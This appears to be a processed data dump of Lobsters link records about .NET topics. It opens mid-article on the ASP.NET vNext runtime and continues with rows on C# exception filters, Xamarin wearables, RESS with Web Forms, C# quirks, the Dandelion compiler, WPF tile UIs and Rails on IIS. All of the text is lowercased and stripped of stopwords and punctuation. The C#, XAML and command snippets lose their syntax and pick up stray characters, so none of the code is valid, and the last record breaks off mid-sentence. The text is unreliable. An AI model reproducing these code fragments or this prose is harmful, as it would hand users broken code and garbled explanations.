support running net application window o x linux logically kre five layer functionality describe layer responsibility layer native process native process thin layer responsibility find call native clr host passing along argument given process used rest stack window native executable klrexe mac linux executable bash script running ii accomplished either new native http module using helios loader helios loader leverage extensibility hook net framework bootstrap kre without requiring installation new ii module native http module run net corebased web apps ii without dependency net framework native http module yet publicly available plan make available future preview layer native clr host clr native clr host three main responsibility boot clr achieved depends version clr example boot net core involves loading coreclrdll configuring starting runtime creating appdomain managed code run mono net framework process varies somewhat outcome call managed entry point next layer entry point native host return process clean shut unload app domain stop runtime layer managed entry point layer first layer written managed code responsible loading assembly satisfying dependency lib folder setting iapplicationenvironment core dependency injection infrastructure calling main entry point specified application application host layer assembly loaded application base path specified lib folder next layer add additional loader resolving dependency nuget package even code compiled run time layer application hostapplication developer compiles entire application assembly disk lib folder layer application end user see want compile application pas name dll containing standard main entry point launching layer however scenario use application host help resolve application dependency run app microsoftframeworkapplicationhost application host provided kre responsibility include walking dependency projectjson building closure dependency app use logic described detail adding additional assembly loader load assembly various source installed nuget package source compiled run time using roslyn calling entry point assembly whose name given argument native process started assembly anything entry point applicationhost know load applicationhost come kre know find public void main method entry point used set aspnet hosting layer know find startupcs run configure method web application one thing note learning kre lowlevel part stack operating kre level world still much finding loading dynamiclink library dlls kre contains logic allow application level think package toplevel dependency kre packaged sdk contains everything need build crossplatform net application previous article aspnet described use kre version manager kvm tool list installed kres machine install new one select kre want use find instruction install kvm o kvm installs kres nuget feed configured using krefeed environment variable kres nuget package traditional sense package ever depend nuget convenient way distribute version kres default kre installed copying extracting kre zip file userprofile kruntimes also previously introduced k package manager kpm tool installing restoring creating nuget package plan rename kpm tool nuget align existing nuget client part alignment kpm subcommands already renamed use bundle command bundle application publishing pack command building creating nuget package project updated build command produce raw build output without packaging anything also new wrap command allows tooling reference existing csprojbased project projectjson default package installed userprofile kpackages folder control setting package path globaljson file crossplatform net console app show create simple crossplatform net console app using kre first need create dll entry point using aspnet console application project template visual studio code look like public class program â public void main string args â â â â consolewriteline hello world â â â consolereadline â look pretty familiar notice entry point actually instance method addition static programmain entry point kre support instancebased entry point even make main entry point asynchronous return task main entry point instance method service injected application runtime environment run application within visual studio command line running directory containing projectjson file application k command really simple batch file command expanded following klrexe appbase microsoftframeworkapplicationhost run k command executes native process klrexe specifies application base current directory specifies default application host native process special knowledge default application simply look standard entry point microsoftframeworkapplicationhost assembly call want use default application host invoke native layer call application directly first build project generate dll console application make sure checked output option build property project find build output artifact directory solution folder navigate directory containing builtin dll kre flavor using call dll name see output console application invoking dll directly lowlevel raw way write application using default application host forego projectjson support improved nugetbased dependency management support instead library depend simply loaded specified lib folder rest article use default application host use iservicemanifest service enumerate service available runtime environment specify additional dependency use assembly assembly neutral interface ani ani type identified solely name namespace feature kre two assemblyneutral type different assembly name namespace considered equivalent mean common abstraction simply declared locally instead declare dependency common component define assemblyneutral iservicemanifest interface console app like namespace microsoftframeworkdependencyinjectionservicelookup â assemblyneutral â public interface iservicemanifest â â â â ienumerable type service get â assemblyneutralattribute come well assemblyneutral course declare locally namespace microsoftnetruntime â assemblyneutral â attributeusage attributetargetsall inherited false allowmultiple true â public sealed class assemblyneutralattribute attribute â â assemblyneutral type get unified run time type used kre code figure injects iservicemanifest service application adding constructor program class iterates service figure injecting iservicemanifest service application namespace â public class program â â â â public program iservicemanifest servicemanifest â â â â â â â â servicemanifest servicemanifest â â â â â â iservicemanifest servicemanifest get â â â public void main string args â â â â â â â â foreach type type servicemanifestservices â â â â â â â â â â â â consolewriteline typefullname â â â â â â â â â application host enable support projectjson add additional assembly resolvers dealing nuget package project reference like make number additional service available application calling entry point application run console app output look like microsoftframeworkruntimeiassemblyloadercontainer microsoftframeworkruntimeiassemblyloadcontextaccessor microsoftframeworkruntimeiapplicationenvironment microsoftframeworkruntimeifilemonitor microsoftframeworkruntimeifilewatcher microsoftframeworkruntimeilibrarymanager microsoftframeworkruntimeicompileroptionsprovider microsoftframeworkruntimeiapplicationshutdown service file watching traversing structure project package assembly application getting compilation option used shutting application aspnet kre still preview active development exact list service see might differ hosting aspnet hosting layer run top kre responsible finding web server run finding startup logic application hosting application server cleaning application shut also provides number additional hostingrelated service application aspnet hosting dll microsoftaspnethosting entry point method get called kre application host configure web server want use specifying server commandline option source configuration data like configjson environment variable hosting layer load specified server assemblytype find iserverfactory used initialize start server typically server must listed dependency projectjson loaded note command defined projectjson really set additional commandline argument klrexe example default aspnet starter web app project template includes bunch command projectjson look something like command â change port number self hosting application â web microsoftaspnethosting server microsoftaspnetserverweblistener â â â serverurls http â gen microsoftframeworkcodegeneration â ef â entityframeworkcommands run web really running klrexe appbase microsoftframeworkapplicationhost microsoftaspnethosting â server microsoftaspnetserverweblistener serverurls http startup aspnet hosting layer also responsible finding startup logic application typically application startup logic defined startup class configure method setting request pipeline configureservices method configuring service application need shown figure figure startup class namespace â public class startup â â â â public void configureservice iservicecollection service â â â â â â â â add service application â â â â â â public void configure iapplicationbuilder app â â â â â â â â configure application pipeline â â â â configure method use iapplicationbuilder interface build request pipeline application application builder let middleware create application builder request delegate request delegate core runtime construct aspnet request delegate take httpcontext something useful asynchronously public delegate task requestdelegate httpcontext context aspnet middleware take input next request delegate pipeline provides request delegate middleware logic returned request delegate may may call next request delegate pipeline shortcut running middleware logic call next request delegate use run extension method iapplicationbuilder apprun async context await contextresponsewriteasync hello world would writing following inline middleware next parameter simply ignored appuse next async context â await contextresponsewriteasync hello world create reusable middleware write class convention next request delegate injected constructor along additional service parameter middleware need implement request delegate middleware asynchronous invoke method shown figure figure implementing middleware reusable class using microsoftaspnetbuilder using microsoftaspnethttp using systemthreadingtasks public class xhttpheaderoverridemiddleware â private readonly requestdelegate next â public xhttpheaderoverridemiddleware requestdelegate next â â â â next next â â public task invoke httpcontext httpcontext â â â â var headervalue â â â â â httpcontextrequestheaders xhttpmethodoverride â â â var queryvalue â â â â â httpcontextrequestquery xhttpmethodoverride â â â stringisnullorempty headervalue â â â â â â â â httpcontextrequestmethod headervalue â â â â â â else stringisnullorempty queryvalue â â â â â â â â httpcontextrequestmethod queryvalue â â â â â â return nextinvoke httpcontext â use middleware following convention using usemiddleware extension method iapplicationbuilder additional option pas method get injected middleware constructor next request delegate injected service convention middleware also define specific use extension method iapplicationbuilder like public static class builderextensions â public static iapplicationbuilder usexhttpheaderoverride â â â iapplicationbuilder builder â â â â return builderusemiddleware xhttpheaderoverridemiddleware â add middleware application pipeline like public class startup â public void configure iapplicationbuilder app â â â â appusexhttpheaderoverride â aspnet come rich set prebuilt middleware middleware handling static file routing error handling diagnostics security find download install middleware microsoft community nuget package nugetorg configuring service entry point seen stack startup class service injected hosting layer constructor additional parameter configure configureservices method enumerate service available startup using iservicemanifest see even service available microsoftframeworkruntimeiassemblyloadercontainer microsoftframeworkruntimeiassemblyloadcontextaccessor microsoftframeworkruntimeiapplicationenvironment microsoftframeworkruntimeifilemonitor microsoftframeworkruntimeifilewatcher microsoftframeworkruntimeilibrarymanager microsoftframeworkruntimeicompileroptionsprovider microsoftframeworkruntimeiapplicationshutdown microsoftaspnethostingihostingenvironment microsoftframeworkruntimeiprojectresolver microsoftframeworkloggingiloggerfactory microsoftframeworkruntimeicache microsoftframeworkruntimeicachecontextaccessor microsoftframeworkdependencyinjectionitypeactivator microsoftframeworkruntimeiassemblyloadcontextfactory ihostingenvironment service give access web root path application typically www folder also ifileprovider abstraction web root used find project solution logging caching service type activator dependency injectionaware iassemblyloadcontextfactory give abstraction creating new assembly load context configure existing service add new one application configureservices method startup class configureservices method take iservicecollection add additional service modify existing one aspnet come simple builtin ioc container set managed entry point layer order bootstrap system easily replace builtin container container choice framework typically provide add extension method adding service iservicecollection example add service used aspnet mvc public void configureservices iservicecollection service â add mvc service service container â servicesaddmvc add service service collection one three type transient scoped singleton transient service created time requested container scoped service created already exist current scope web application container scope created request think scoped service per request singleton service ever created webconfig systemconfigurationstyle appconfig file supported aspnet instead aspnet come new simplified configuration api microsoftframeworkconfigurationmodel working configuration data new configuration api let retrieve manipulate configuration data variety source default configuration provider included json xml ini commandline parameter environment variable specify multiple provider used order added supporting environmentbased configuration easily deploy application environment pick appropriate setting environment initialize configuration data add desired configuration provider new configuration instance public startup ihostingenvironment env â configuration new configuration â â â addjsonfile configjson â â â addenvironmentvariables request configuration value name string user configurationget user string password configurationget password make configuration data available strongly typed way throughout application using option model option plain old c object poco class bunch property used configuration make option available application calling addoptions add ioptions toption service container service used access option different type wherever dependency injection supported configure option add iconfigureoptions toptions service container default implementation ioptions toption service gather toption service use configure option instance making option instance available consumer shortcut adding option configuration logic use configure toption method like servicesconfigure mvcoptions option optionsfiltersadd â new myglobalfilter option model configuration model work easily bind configuration data option matching property name using configure overload take configuration instance like servicesconfigure myoptions configuration request processing web server started start listening request invoking application pipeline request server surface request server environment object expose set finegrained feature interface feature interface sending file web socket session support client certificate see full list supported feature interface github example feature interface http request assemblyneutral public interface ihttprequestfeature â string protocol get set â string scheme get set â string method get set â string pathbase get set â string path get set â string querystring get set â idictionary string string header get set â stream body get set typically code directly various feature web server use feature interface expose lowlevel functionality host layer hosting layer wrap feature interface strongly typed httpcontext passed application level loose coupling web server hosting layer application allows server implemented reused without tied one specific hosting model allows application hosted different server aspnet come builtin support running ii microsoftaspnetserveriis directly thin httpsys wrapper new net crossplatform web server called kestrel microsoftaspnetserverkestrel open web interface net owin community standard owinorg share similar goal loose coupling web application owin standardizes net server application talk aspnet support owin microsoftaspnetowin package host aspnet owinbased web server use owin middleware within aspnet pipeline â katana project katanaprojectcodeplexcom initial effort implement support owin many idea concept aspnet derived katana similar model building middleware pipeline hosting multiple server however unlike katana exposed lowlevel owin abstraction directly developer aspnet instead bridge owin convenient userfriendly abstraction little extra code still use katana middleware aspnet using owin bridge see example wrapping aspnet runtime built ground support crossplatform web application aspnet flexible layered architecture run net framework net core even crossplatform mono future net core well new aspnet hosting model make easy compose application host web server choice entire runtime built support dependency injection easy configure hope enjoyed learning new aspnet runtime feedback contribution welcome github project githubcomaspnethome daniel rothâ senior program manager aspnet team currently working aspnet passion include net development delighting customer making framework simple easytouse thanks following microsoft technical expert reviewing article glenn condron david fowler murat girgin chris ross
567,Lobsters,dotnet,"C#, F#, .NET programming",C# 6 Exception Filters and How they are much more than Syntactic Sugar,http://volatileread.com/Wiki/Index?id=1087,c exception filter much syntactic sugar,exception filter really new feature could nt achieve exactly writing condition inside catch block make difference try new c feature online,exception filter exception filter new feature c allows specify condition along catch block catch block executed condition satisfies following code illustrates syntax run display caught really new feature c yes however support il already present vbnet already feature even f utilized exception pattern matching could nt achieve exactly writing condition inside catch block logically yes fundamental difference condition catch block catching exception checking condition exception filter checking condition catching exception condition satisfied catch block skipped code move check catch block matching exception make difference catch excpetion stack unwound lose critical information crash dump misconception use throw statement catch block instead throw ex stack preserved result people think exception stacktrace property clr stack let see example try self make sure break exception handled excptions unchecked visual studio setting debug exception uncheck thrown column common scenario catch exception log nothing else following image illustrates debugger stop exception thrown notice line debugger break local window rewrite portion make use excetion filter modify log function always return false log using exception filter instead inside catch block notice debugger break local window edit syntax changed since time article originally written example updated except image instead catch log read catch log apart telling exactly exception occured also see local window second case show local variable localvariable first case unable inside catch block local variable top stack frame fairly corresponds see crash dump notice much difference would make investigation analyzing crash dump local value available also code enters catch block enter catch block catch exception based condition decide throw checked catch block case exception filter condition satisfied catch block skipped code move check catch block matching exception related try new c feature online
568,Lobsters,dotnet,"C#, F#, .NET programming",Getting Started with Android Wearables using Xamarin and Visual Studio,http://www.geekswithblogs.net/dotNETvinz/archive/2015/02/12/getting-started-with-android-wearable-using-xamarin-and-visual-studio.aspx,getting started android wearable using xamarin visual studio,wearable device xamarin setting development environment creating simple android wear application http developerxamarincomguidesandroidgettingstarted folder purpose running application http developerxamarincomsamplesandroidandroid,wearable device term wearable device wearable refer electronic technology computer incorporated item clothing accessory comfortably worn body example google glass smart watch opportunity explore android wearable device particularly smart watch decided use xamarin visual studio following reason xamarin allows build crossplatform apps io andriod window app using c experienced c developer familiar visual studio development tool give le learning curve learn use framework editor tool programming language build native apps take advantage cool feature provided xamarin cloud testing app monitoring xamarin visual studio quite popular stable platform building real world apps opportunity work android wearable exciting getting popular nowadays yes exciting time scary nt much experience technology smart watch device android stuff mean learn scratch everything work technology android framework also aware bit learning curve deal working technology completely different compared web development writing post guide new comer like get started android wear application development setting development environment first thing need install necessary tool first need install visual studio using visual studio make sure professional higher version xamarin extension visual studio supported nonexpress edition see http xamarincomfaq detail case used visual studio ultimate version installed supported version visual studio go head download xamarin extension visual studio http xamarincomvisualstudio start free trial license version follow instruction download wizard complete note may take longer depending framework installing may need restart machine reflect everything installed machine launch visual studio able see following item tool menu ensure everything need installed verify android sdk manager go tool android android sdk manager open following window think everything need installed congratulation start creating awesome android app using xamarin within visual studio creating simple android wear application let go ahead create new project within visual studio template select android wear app android able see something like click ok let visual studio generate necessary file build wear app image show generated file default sample code get started working building wear apps easy right anatomy xamarinandroid application taken official documentation http developerxamarincomguidesandroidgettingstarted folder purpose reference contains assembly required build run application expand reference directory see reference net assembly system systemcore systemxml well reference xamarin monoandroid assembly component component directory house readymade feature xamarin component store public marketplace xamarin code information xamarin component refer xamarin component walkthrough asset contains file application need run including font local data file text file file included accessible generated asset class information android asset see xamarin using android asset guide property contains androidmanifestxml file describes requirement xamarinandroid application including name version number permission property folder also house assemblyinfocs net assembly metadata file good practice fill file basic information application resource contains application resource string image layout access resource code generated resource class android resource guide provides detail resource directory application template also includes concise guide resource aboutresourcestxt file running application order u run application need first setup emulator create one following step go tool andriod andriod emulator manager simply click avd icon tool bar see android device manager window show edit start create delete repair virtual device click create button following window open allows select device want create case need create virtual android wear device u run application emulator everything set click ok create emulator done able see device created click start launch run emulator background note may take time load emulator emulator loaded ready able see name virtual device created start debugging dropdown like set application startup project run pressing sample output wear application running within emulator want refer wear app example visit link http developerxamarincomsamplesandroidandroid hope someone find post useful next blog post demonstrate debugging installing uninstalling wear apps within real wearable device stay tuned
569,Lobsters,dotnet,"C#, F#, .NET programming",Optimizing Responsive Design Using RESS with ASP.Net Web Forms,http://developer.telerik.com/featured/optimizing-responsive-design-using-ress-with-asp-net-web-forms/,optimizing responsive design using res aspnet web form,telerik device detection framework responsive design app bloat responsive utility res responsive design server side component creating layout server side device detection implementation aspx aspxcs lazy loading small ajax request wrap,due part popularity open source solution like bootstrap foundation responsive web design standard practice modern web application responsive design attractive solution ability produce multidevice layout relative ease responsive design excellent solution shortcoming even design quickly cause application bloat let get understanding application bloat issue responsive design resolve look solution using aspnet web form create responsive layout using new radpagelayout component later learn telerik device detection framework bring responsive application next level giving u serverside control responsive behavior responsive design app bloat technique used create attractive responsive behavior toggling mobile desktop friendly ui element increase file size result slow performance responsive design framework include mechanism allowing ui component displayed hidden depending device size example bootstrap responsive utility contain visible size hidden size cs class utility class work advertised however hide content visually markup image data required produce ui still sent browser wasteful process result bloated page size bootstrap warns user use technique sparingly documentation try use limited basis avoid creating entirely different version site utility class good prototyping scenario minor ui adjustment nt robust enough use difficult task example use bootstrap visible utility class replace large banner image smaller one depending device screen size code large header image shown medium large screen small header image shown small extra small screen surface desired effect work flawlessly however take deeper look see browser still downloading resource visible user img src contentlargeheaderimagepng class visiblelginline visiblemdinline img src contentsmallheaderimagepng class visiblexsinline visiblesminline example large screen example small example inspection using chrome developer tool reveal resource received client see screen shot image downloaded downloading image client must download total image data regardless screen size complete waste bandwidth cause slow mobile performance example used image hiding type content creates scenario hiding content bad practice done effectively optimize content specific screen size one solution use server side functionality serve client need res responsive design server side component saw cs hideshow technique used responsive design cause page bloat ui change made solely client side mean client must receive markup image data respond device screen size proactive approach taken including server process using server side code application deliver necessary content specific device need unlike visible hidden cs class res technique depend server perform action thus reducing page size implement res use one server friendly web development platform aspnet web form web form well established platform enterprise world many enterprise application benefit new mobile technique like responsive design res addition also using telerik technology giving u two powerful solution get job done radpagelayout device detection framework creating layout server side telerik radpagelayout responsive design developed completely server side component radpagelayout grid based framework similar bootstrap foundation responsive grid functionality included twelve column nestable grid multiple device size option column width offset source order functionality however radpagelayout set self apart framework fully configurable server side component aspnet web form developer find familiarity radpagelayout control property panel reduces learning curve associated responsive design row column screen size attribute set via property window visual studio adding radpagelayout simple dragging component toolbox creating markup hand notice gridtype set fluid tell radpagelayout want layout expand contract fit client screen size telerik radpagelayout id runat server gridtype fluid telerik radpagelayout add multiple row column layout starting row first breaking row column span twelve unit grid example wanted row two width column would create layout one row row would two column span six unit totaling unit even define many unit span depending screen size viewed using span size property telerik radpagelayout id runat server gridtype fluid row telerik layoutrow id runat server accesskey htmltag div rowtype row wrapperhtmltag none column telerik layoutcolumn id runat server htmltag div span spanmd spansm spanxs first column telerik layoutcolumn telerik layoutcolumn id runat server htmltag div span spanmd spansm spanxs second column telerik layoutcolumn column telerik layoutrow row telerik radpagelayout radpagelayout component layoutrow layoutcolumn set runat server server side access control runtime developer comfortable using property window even create row column well radpagelayout first piece res radpagelayout responsive grid system property capable changed server side runtime still relies cs client get full control sent client need additional tool telerik device detection framework device detection implementation order perform res functionality web form need able identify device size server side would normally involve creating managing collection user agent string identify web browser type device requesting content server thankfully device detection easily added application using telerik device detection framework device detection framework easy use api detects whether screen small medium large extra large simply reference device detection framework pas useragent string request detector bring back corresponding client screen size devicescreensize screensize detectorgetscreensize requestuseragent screensize devicescreensizeextralarge extralarge screen specific code continuing example used earlier let see technique come together client server make complete experience first let revisit image size problem showing large banner graphic medium large screen showing smaller graphic le capable device let radpagelayout handle responsive content except time control image sent client using device detection framework showing hiding image server side longer sending extra data client also use cs ensure image rendered fluid layout setting maxwidth style imgresponsive maxwidth style asp image id largebannerimage imageurl imageslargeheaderimagepng cssclass imgresponsive runat server asp image id smallbannerimage imageurl imagessmallheaderimagepng cssclass imgresponsive runat server telerik radpagelayout id runat server gridtype fluid row telerik layoutrow id accesskey htmltag div rowtype row wrapperhtmltag none column telerik layoutcolumn id htmltag div span spanmd spansm spanxs first column title p lorem ipsum dolor sit amet consectetur adipiscing elit nam ac faucibus lacus nam tincidunt dolor nec lacus pharetra scelerisque vestibulum eget maximus erat etiam euismod porta felis placerat sed risus dolor pretium sed metus et maximus aliquet lacus praesent laoreet vulputate nisl eu scelerisque p telerik layoutcolumn telerik layoutcolumn id htmltag div span spanmd spansm spanxs second column title p lorem ipsum dolor sit amet consectetur adipiscing elit nam ac faucibus lacus nam tincidunt dolor nec lacus pharetra scelerisque vestibulum eget maximus erat etiam euismod porta felis placerat sed risus dolor pretium sed metus et maximus aliquet lacus praesent laoreet vulputate nisl eu scelerisque p telerik layoutcolumn column telerik layoutrow row telerik radpagelayout aspx protected void pageload object sender eventargs e var screensize detectorgetscreensize requestuseragent var ismediumorsmaller screensize devicescreensizemedium screensize devicescreensizesmall var islargeorlarger screensize devicescreensizelarge screensize devicescreensizeextralarge largebannerimagevisible islargeorlarger smallbannerimagevisible ismediumorsmaller aspxcs code behind using device detection control visibility banner image largebannerimage set visible large extralarge screen detected smallbannerimage set visible medium small screen detected result tested using device emulation web browser tool first example example small screen example inspection developer tool notice client receiving small header image practice applied image single control container control like radpagelayout layoutrow layoutcolumn modified server side optimize user experience remember great power come great responsibility make sure use technique wisely hiding content giving user way access problem order make sure user always get need deploy another technique called lazy loading lazy loading feature aspnet web form give u unlimited option building uis based need user device aspnet ascx user control page composed run time page even section lazy loaded via ajax lacarte allowing user load content demand see fit lazy loading content advantage keeping content hidden still available user want see example change thing bit time use dashboard like application grid data pie chart scenario want modify data grid show pertinent data addition nt always need see pie chart hiding default mobile since nt want pie chart completely accessible mobile give user option lazy load pie chart via button using ajax allowing user lazy load content putting control user experience begin radgrid radhtmlchart added radpagelayout layoutcolumn containing chart panel containing radbutton created button available small device detected chart visible telerik radpagelayout id runat server gridtype fluid row telerik layoutrow id runat server accesskey htmltag div rowtype row wrapperhtmltag none column telerik layoutcolumn id runat server htmltag div span spanmd spansm spanxs tooltip first column telerik radgrid id runat server grouppanelposition top rendermode auto selectmethod bindproducts skin metro cellspacing gridlines allowpaging true pagesize grid code telerik radgrid telerik layoutcolumn telerik layoutcolumn id runat server htmltag div span spanmd spansm spanxs last column asp panel id analysispanel runat server visible false cssclass analysispanelaction telerik radbutton id showanalysisbutton runat server cssclass rbprimarybutton onclick showanalysisbuttonclick buttontype skinnedbutton text show inventory analysis telerik radbutton asp panel telerik radhtmlchart id runat server rendermode auto selectmethod getinventoryanalysis charttitletext inventory analysis width chart code telerik radhtmlchart telerik layoutcolumn column telerik layoutrow row telerik radpagelayout next need radajaxmanager wire lazy loading mechanic need use ajax without entire page would need post back defeating purpose saving bandwidth telerik radajaxmanager id runat server defaultloadingpanelid ajaxsettings telerik ajaxsetting ajaxcontrolid updatedcontrols telerik ajaxupdatedcontrol controlid updatepanelcssclass updatedcontrols telerik ajaxsetting telerik ajaxsetting ajaxcontrolid showanalysisbutton updatedcontrols telerik ajaxupdatedcontrol controlid analysispanel updatepanelcssclass telerik ajaxupdatedcontrol controlid updatepanelcssclass updatedcontrols telerik ajaxsetting ajaxsettings telerik radajaxmanager finally wire server side time take advantage device detection framework setting additional property grid since limited space small device choose display data grid column user choose show needed minimize data grid decreasing page size chart visibility set false making sure html sent client place render panel contains show inventory analysis button protected void pageload object sender eventargs e pageispostback var screensize detectorgetscreensize requestuseragent screensize devicescreensizesmall productid display false discontinued display false unitsinstock display false false analysispanelvisible true protected void showanalysisbuttonclick object sender eventargs e true analysispanelvisible false final result user presented full display large screen mobile user given access exact data except optimized experience example large screen example small screen example small screen w ajax small ajax request wrap responsive web design stay important realize strength weakness great solution many problem come nuance using html cs javascript good start especially need prototype application behavior remember take close look see happening client browser lot room optimize gain performance provide better user experience mobile responsive design server side component give app edge need set apart application
570,Lobsters,dotnet,"C#, F#, .NET programming","C# Quirks, Gotchas & Pitfalls - Predict the Output challlenge",http://volatileread.com/Wiki/Index?id=1073,c quirk gotchas pitfall predict output challlenge,dynamic mess click view snippet ienumerable nuance captured variable parameter preference,good c predict output code snippet get wrong nt fret even experienced programmer fumble get wrong time dynamic mess first consolewriteline statement display type systembyte magically type change second call get right basically happens time byte operator compiler convert call overload convert back byte however dynamic type last step converting result back byte never happens type remains edit received comment output second time reasoning adding byte wrote another snippet demonstrate even add byte value output still remains click view snippet ienumerable nuance would code print done throw exception code nt throw exception expected code within function getchars executes enumerate captured variable ok one simple get right print five time execute action inside loop loop value execution parameter preference output might seem unexpected per c specification value inferred int much better match function object parameter
573,Lobsters,dotnet,"C#, F#, .NET programming",Dandelion: a Compiler and Runtime for Heterogeneous Systems,http://research.microsoft.com/apps/pubs/default.aspx?id=201110,dandelion compiler runtime heterogeneous system,,computer system increasingly rely heterogeneity achieve greater performance scalability energy eﬃciency heterogeneous system typically comprise multiple execution context diﬀerent programming abstraction runtimes programming remains extremely challenging dandelion system designed address programmability challenge dataparallel application dandelion provides uniﬁed programming model heterogeneous system span diverse array execution context including cpu gpus fpgas cloud adopts net linq language integrated query approach integrating dataparallel operator general purpose programming language c f therefore provides expressive data model native language integration userdeﬁned function enables programmer write application using standard highlevel language development tool independent speciﬁc execution context dandelion automatically transparently distributes dataparallel portion program available computing resource including compute cluster distributed execution cpu gpu core individual compute node parallel execution enable automatic execution net code gpus dandelion crosscompiles net code cuda kernel us gpu dataﬂow runtime called edge manage gpu execution paper describes design implementation dandelion compiler runtime focusing distributed cpu gpu implementation report evaluation system using diverse set workload execution context
574,Lobsters,dotnet,"C#, F#, .NET programming",Create a Modern UI with UI for WPF,http://developer.telerik.com/featured/create-a-modern-ui-with-ui-for-wpf/,create modern ui ui wpf,teleriknext getting started ui wpf adding meaningful text adding ui element tile path data mail xamlalot mail icon download xaml canvas text open clip art inkscape microsoft expression design different size tile determining item clicked better grouping item github repo wait love wpf happening teleriknext teleriknext building touch apps ui wpf use promo code crump register receive standard ticket price intel free press,release window upcoming release window touch becoming norm pc user pc manufacture releasing touchscreen everything including laptop nt mean abandon skill set write window store apps utilize functionality telerik ui wpf make app touchfriendly couple line code article talk control included telerik ui wpf called radtilelist simply put want achieve modern ui style xaml application similar modern mode window radtilelist covered display tile mosaic manner allows enduser ability smoothly scroll left right gesture reordered using drag drop like window use radtilelist touch screen monitor well mouse without forcing user upgrade new o note indepth information make app touchfriendly check session teleriknext detail included end article getting started make sure downloaded installed ui wpf proceeding complete open visual studio navigate telerik template select window telerik c wpf application provide name place checkmark telerikwindowscontrolsdata automatically select dependent reference finally press next finish wpf app ready begin coding begin adding background color wpf app creating three tile resemble experience might window use color window x class modernappwithwpfmainwindow xmlns http xmlns x http xmlns telerik http title mainwindow height width background dodgerblue grid telerik radtilelist x name telerik tile background blueviolet telerik tile background purple telerik tile background green telerik radtilelist grid window generate following using touchscreen note without adding additional code able handle right left swipe event select item also automatically resized tile window expanded adding meaningful text look feel modern app let add meaningful text tile begin adding textblock style gridresources match look feel window apply style tile grid look like following grid gridresources style targettype textblock x key tilelabelstyle setter property fontsize value setter property fontfamily value segoe ui setter property margin value setter property foreground value white setter property verticalalignment value bottom style gridresources telerik radtilelist x name telerik tile background blueviolet textblock text photo style staticresource tilelabelstyle telerik tile telerik tile background purple textblock text map style staticresource tilelabelstyle telerik tile telerik tile background green textblock text mail style staticresource tilelabelstyle telerik tile telerik radtilelist grid run application see following adding ui element tile could easily use path data wanted mail tile following code telerik tile x name mail background green grid path data z z z fill white horizontalalignment center verticalalignment center path textblock text mail style staticresource tilelabelstyle grid telerik tile would produce following tile thing map since path data easy use requires additional asset added project probably wondering would find path data input field one great resource path data may use freely enterprise apps come xamlalot case search database existing clipart mail icon select download xaml canvas text want remove everything inside code snippet except path data code snippet formatted used canvas another free option called open clip art search clipart want convert svg format xaml using inkscape prefer create path data number way prefer microsoft expression design use copy xaml option available tool trick search find best complicated background would probably use image added photopng project telerik tile grid image source photopng stretch fill textblock text photo style staticresource tilelabelstyle grid telerik tile app currently look like following different size tile worth mentioning three different tile type found window single tile template otherwise known standard tile template double tile template otherwise known wide tile template quadruple two wide tile template stacked top one another simple example would setting tiletype shown telerik tile background purple tiletype single textblock text map style staticresource tilelabelstyle telerik tile since map tile something user may use often let change tile type single tile mail tile quadruple determining item clicked easily determine tile added clicked adding selectionchanged event declaration radtilelist writing couple line code shown declaration xaml telerik radtilelist x name selectionchanged code mainpagexamlcs private void object sender selectionchangedeventargs e var selecteditem tile messageboxshow selecteditemname long x name set tile messagebox display tilename shown telerik tile background purple tiletype single x name map telerik tile better modern apps usually sort background tile layered top achieve removing background color adding following code declared radtilelist xaml telerik radtilelistpanoramabackground image source largebackgroundpng telerik radtilelistpanoramabackground grouping item app starting take shape another feature modern apps grouping radtilelist arrange tile separate section depending user requirement group modified grouptemplate property first need add datatemplate gridresources shown datatemplate x key grouptemplate textblock text binding foreground gray fontweight bold fontsize fontfamily segoe ui datatemplate add grouptemplate property xaml declaration telerik radtilelist x name selectionchanged grouptemplate staticresource grouptemplate finally use builtin tilegroup give group header index appear telerik tilegroup header software development displayindex telerik tilegroupitems telerik tile x name visualstudio background purple textblock text visual studio style staticresource tilelabelstyle telerik tile telerik tile x name blend background dodgerblue textblock text blend style staticresource tilelabelstyle telerik tile telerik tile x name ildasm background black textblock text ildasm style staticresource tilelabelstyle telerik tile telerik tilegroupitems telerik tilegroup let check action source code article available github repo wait love wpf happening teleriknext took look today making wpf app modern using tilelist ui control seen allows u modern ui similar window wpf application many enterprise investigating going upgrade window go ahead provide user modern ui punch line barely scratched surface modern apps ui wpf conference coming called teleriknext session called building touch apps ui wpf love attend use promo code crump register receive standard ticket price talk release window touch important consideration app going forward take standard wpf app turn application responds various gesture including swipe pinch tap tap move tap hold also explore various touchfriendly control explore scenario nt use feature teaser app go touchfriendly version couple line code notice button font larger designed work touch see header image courtesy intel free press
575,Lobsters,dotnet,"C#, F#, .NET programming","Running Ruby on Rails on IIS8 (or anything else, really) with the new HttpPlatformHandler",http://www.hanselman.com/blog/AnnouncingRunningRubyOnRailsOnIIS8OrAnythingElseReallyWithTheNewHttpPlatformHandler.aspx,running ruby rail anything else really new httpplatformhandler,nodejs running ii using iisnode java tomcat jetty release httpplatformhandler get ii running java easily httpplatformhandler could process listen port http request running ruby rail ii httpplatformhandler http railsinstallerorg ruby rail bundler sqlite tinytds railsftw httpplatformhandler web platform installer railsinstaller rubyinstaller note update gem time writing let ii warningdisclaimer keep scrolling example using jruby trinidadtomcat puma farther page sysinternals process explorer application ranjith ramachandra ranjithtweets andrew westgarth apwestgarth tl dr jruby trinidad told trinidad vogue however trindadtomcat puma related link sponsor infragistics control download free hosting,year numerous hack way get ruby rail run ii also way get java via tomcat jetty go language environment run well way get nodejs running ii using iisnode nodespecific blog post find say thing like get rail run ii step like ten others say deploy rail ii difficult lot documentation need special fastcgi implementation welcome hell longer azure website supported node java tomcat jetty production nice run ii brought support window running ii release httpplatformhandler example get ii running java easily let see work well ruby rail well httpplatformhandler interesting check doc mean ii host anything run window easily thing possible kind hack fastcgi great httpplatformhandler nt rail process listening port get value ii total control selfhosting scenario httpplatformhandler ii module ii following two thing process management http listener could process listen port http request example tomcat jetty nodeexe ruby etc proxy request process manages clear work ruby rail window host webrick locally going go production window want ii likely jruby tomcat container similar using nginx linux value ii provide scenario like static file hosting reverse proxy complex auth span multiple apps language framework monitor manages process looking memory cpu crash etc running ruby rail ii httpplatformhandler first make sure ruby rail skip forward use http railsinstallerorg window go get ruby rail bundler sqlite tinytds even sql server support kind another good rail window railsftw go turn window feature make sure ii installed well get httpplatformhandler get web platform installer install make folder app going make put c inetpubwwwrootrails move around like rightclick folder ii manager convert application run gem install rail make sure rail first place installed railsinstaller installed rubyinstaller get rail note issue ssl running gem window need manually update gem time writing sure nt already done installer symptom saw weird error bundle install fixed inside c inetpubwwwrootrails ran rail new 